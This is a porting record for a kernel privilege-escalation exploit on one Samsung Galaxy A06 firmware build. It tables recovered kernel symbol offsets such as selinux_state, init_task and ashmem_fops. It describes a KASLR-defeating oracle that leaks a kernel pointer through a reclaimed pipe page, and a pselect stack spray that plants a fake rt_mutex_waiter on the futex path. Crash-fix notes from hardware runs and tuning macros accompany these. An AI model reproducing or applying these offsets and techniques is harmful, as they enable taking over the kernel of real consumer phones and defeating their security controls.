# SM-A065F / A065FXXSCCZF1 Port Record

## Target Identity

```text
model: SM-A065F
device: a06
region/CSC: AFG / XSG
AP/PDA: A065FXXSCCZF1
CSC: A065FOJMCCZF1
display build: BP2A.250605.031.A3.A065FXXSCCZF1
system fingerprint: samsung/a06xx/a06:16/BP2A.250605.031.A3/A065FXXSCCZF1:user/release-keys
Android SDK: 36 (Android 16)
ABI: arm64-v8a
page size: 4096 (4K)
kernel release: Linux version 6.6.82-android15-8-abA065FXXSCCZF1-4k (kleaf@build-host) (clang 18.0.0, LLD 18.0.0) Wed Jun 10 02:04:52 UTC 2026
```

## Firmware & Kernel Extraction

```text
boot.img size: 67,108,864 bytes
compressed kernel payload: 14,462,142 bytes (GZIP)
raw ARM64 Image size: 41,175,552 bytes (0x2744a00)
text_offset: 0x0
image_size: 0x2b80000
flags: 0xa
BTF range: [0x1792634, 0x1d7c659) (6,201,381 bytes)
ELF Base: 0xffffffc080000000
Total Recovered Symbols: 120,023
```

## Recovered Target Symbols & Offsets

| Symbol / Structure Offset | Virtual Address | Image Offset |
| :--- | :--- | ---: |
| `worker_thread` | `0xffffffc080149b84` | `0x00149b84` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` (post-`schedule`) | `0xffffffc08014a120` | `0x0014a120` |
| `COPY_SPLICE_READ_OFF` (`copy_splice_read`) | `0xffffffc0801ebda0` | `0x001ebda0` |
| `ashmem_ioctl` | `0xffffffc0803905ac` | `0x003905ac` |
| `ashmem_mmap` | `0xffffffc080390d38` | `0x00390d38` |
| `ashmem_open` | `0xffffffc080390f64` | `0x00390f64` |
| `ashmem_release` | `0xffffffc080390fe8` | `0x00390fe8` |
| `ashmem_show_fdinfo` | `0xffffffc080391070` | `0x00391070` |
| `call_usermodehelper_exec_work` | `0xffffffc0809cb53c` | `0x009cb53c` |
| `configfs_read_iter` | `0xffffffc080a14268` | `0x00a14268` |
| `configfs_bin_write_iter` | `0xffffffc080a14720` | `0x00a14720` |
| `noop_llseek` | `0xffffffc080f7f960` | `0x00f7f960` |
| `compat_ashmem_ioctl` | `0xffffffc080fb423c` | `0x00fb423c` |
| `anon_pipe_buf_ops` | `0xffffffc08116a008` | `0x0116a008` |
| `ashmem_fops` | `0xffffffc0812f0b80` | `0x012f0b80` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` (`"nfnetlink_log"`) | `0xffffffc081646103` | `0x01646103` |
| `kmalloc_caches` | `0xffffffc0816b5750` | `0x016b5750` |
| `__start_ftrace_events` | `0xffffffc081e808e0` | `0x01e808e0` |
| `__event_sched_blocked_reason` | `0xffffffc081e80ba8` | `0x01e80ba8` |
| `SLIDE_TRACEFS_EVENT_ID` | `20 + 89` | `109` |
| `system_unbound_wq` | `0xffffffc081ebae60` | `0x01ebae60` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` (`nfulnl_logger`) | `0xffffffc081ec2250` | `0x01ec2250` |
| `init_task` | `0xffffffc081ecd2c0` | `0x01ecd2c0` |
| `random_table` | `0xffffffc082677a88` | `0x02677a88` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `0xffffffc082677b90` | `0x02677b90` |
| `ashmem_misc` | `0xffffffc0826bab20` | `0x026bab20` |
| `root_task_group` | `0xffffffc082754d80` | `0x02754d80` |
| `selinux_state` | `0xffffffc082977210` | `0x02977210` |
| `sysctl_bootid` | `0xffffffc082a18c48` | `0x02a18c48` |

## Physical Address Map

```c
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END  0xffffff9000000000ULL
#define VMEMMAP_START   0xfffffffe00000000ULL
```

## P0 Slide Table

Generated and verified with 32 candidate rows (`0x000000` through `0x1f0000`) and 256 qwords against `Image[0x1f0000 - slide]`.

- Header: `src/targets/a06-A065FXXSCCZF1/p0_fingerprint.h`
- Target Configuration: `src/targets/a06-A065FXXSCCZF1/target.h`
- Feed Manifest: `support/targets-v3.json` (`a06-A065FXXSCCZF1`)

## Virtual KASLR Oracle (crash fix)

The A06 (MT6768) kernel can boot with a **large virtual KASLR slide far
beyond the 2 MB physical P0 fingerprint range**. A supervision run previously
crashed in `rt_mutex_adjust_prio_chain` with a NULL `waiter->lock`
dereference:

```text
Kernel Offset: 0x25af280000   (~151 GB virtual slide)
```

With only `APP_PHYS_P0_ORACLE`, the physical oracle recovers the small
`slide_p0_offset` (`0x000000`..`0x1f0000`) but the fake waiter object is
placed using a **wrong virtual base**, so the kernel reads the real stack
waiter instead of the sprayed fake waiter and dereferences its NULL `lock`
field.

The fix enables the virtual base oracle exactly like the a36xq MediaTek
sibling:

```c
#define APP_PHYS_VIRTUAL_BASE_ORACLE 1
#define KIMAGE_VIRTUAL_BASE_MIN 0xffffffc080000000ULL
#define KIMAGE_VIRTUAL_BASE_MAX 0xfffffff07fe00000ULL
#define SLIDE_VIRTUAL_BASE_DELAY_USEC 25000
```

`KIMAGE_VIRTUAL_BASE_MIN` equals `KIMAGE_TEXT_BASE` (slide = 0). ARM64 KASLR
never maps the kernel below the text base — the virtual slide is always
additive — so accepting slide 0 is correct and strictly more permissive than
the a36xq bound (`0xffffffd080000000`). `slide_commit_virtual_base()`
independently enforces the canonical `0xffff` upper 16 bits and 2-MiB
alignment, and `KIMAGE_VIRTUAL_BASE_MAX` caps the range.

After the physical P0 offset is recovered, `slide_leak_virtual_base()`
reclaims a kernel page, applies the physical write against
`data_alias(ASHMEM_MISC_FOPS)` (slot 1 in `SLIDE_BANK_SLOTS`), reads the
live `ashmem_misc.fops` pointer from the reclaimed pipe page, subtracts
`ASHMEM_FOPS_OFF`, and commits the result as the arbitrary virtual kernel
base (`KIMAGE_VIRTUAL_BASE_MIN/MAX` bound it to the canonical A06 KASLR
range). The existing fingerprint-table slide continues to work
unchanged; it is no longer required to cover the whole virtual slide. It is
exercised on the `SLIDE_P0_OFFSET` (retry) path, after the supervisor
republishes the discovered small offset.

## pselect fd_set capacity (crash fix)

The A06 6.6.82 kernel `core_sys_select()` keeps the fd_set copies on the
kernel stack only while `FDS_BYTES(nfds) <= SELECT_STACK_ALLOC/6` with
`SELECT_STACK_ALLOC=256` (`include/linux/poll.h` `FRONTEND_STACK_ALLOC`), i.e.
**at most 42 bytes per set = nfds 320**.  With `nfds=320` the three sets give
15 qwords on stack, base `stack+0x3c20` (verified in crash #5: word 0 of the
fake landed at `0x3c80`).  Any `nfds >= 321` falls back to `kvmalloc` and the
fake never touches the waiter thread's stack — that is exactly what happened
with the earlier `SLIDE_PSELECT_NFDS=576` build (crashes #6/#7 all-zero at the
walked waiter).

Consequently `SLIDE_PSELECT_NFDS` must stay at `320` (on-stack), and
`SLIDE_PSELECT_WORD_SHIFT` must be tuned at runtime (the futex
`rt_mutex_waiter` stack offset differs per futex call path). The build now
reads `SLIDE_PSELECT_WORD_SHIFT` from the environment (default 12 = the only
verified overlap, word 0 at `0x3c80`):

```c
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_PSELECT_WORD_SHIFT 12   /* runtime override: env SLIDE_PSELECT_WORD_SHIFT */
```

Because `waiter->lock` sits at `0x3cd8` = global index 23 but only indices
0..14 are reachable with the on-stack 15 qwords, the fast REQUEUE_PI futex
path cannot be fully faked on this kernel; the stack copy can only ever cover
part of the waiter. The consumer must fire while the futex wait is still
active (pi_blocked_on non-NULL with a valid lock) and the fd_set copy must
overlap the exact waiter base, which the runtime shift enables to iterate on
hardware.
